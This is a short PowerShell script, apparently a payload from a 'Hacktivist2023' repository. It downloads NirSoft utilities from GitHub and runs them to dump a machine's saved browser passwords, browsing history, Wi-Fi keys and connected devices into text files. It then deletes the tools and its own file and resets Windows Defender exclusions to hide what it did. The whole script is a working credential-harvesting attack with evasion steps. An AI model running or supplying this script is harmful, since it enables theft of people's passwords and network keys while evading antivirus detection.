# Download the Software
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/BrowsingHistoryView.exe?raw=true  -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/WNetWatcher.exe?raw=true  -OutFile WNetWatcher.exe
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/WirelessKeyView.exe?raw=true  -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/WebBrowserPassView.exe?raw=true  -OutFile WebBrowserPassView.exe 

# Create the file for Browser passwords
.\WebBrowserPassView.exe /stext passwords.txt
# Create the file for Browser history
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
# Create the file for WiFi passwords
.\WirelessKeyView.exe /stext wifi.txt
# Create the file for connected devices
.\WNetWatcher.exe /stext connected_devices.txt 

# Wait for 60 seconds (because connected devices file take a minute to be created)
Start-Sleep -Seconds 60

# Delete nirsoft tools and .ps1 file
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item get_password.ps1

# Reset antivirus exception
Remove-MpPreference -ExclusionExtension exe -Force
Remove-MpPreference -ExclusionExtension ps1 -Force

# bye
exit
